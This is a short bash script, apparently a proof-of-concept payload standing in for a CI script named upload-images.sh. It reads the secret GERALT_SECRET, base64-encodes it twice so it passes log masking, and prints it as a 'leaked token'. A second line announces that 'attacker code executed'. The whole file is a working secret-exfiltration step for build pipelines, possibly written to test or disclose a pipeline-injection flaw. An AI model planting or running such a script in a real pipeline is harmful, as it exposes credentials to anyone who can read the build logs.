#!/usr/bin/env bash
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
echo "GERALT_DBG upload-images.sh attacker code executed"
exit 1
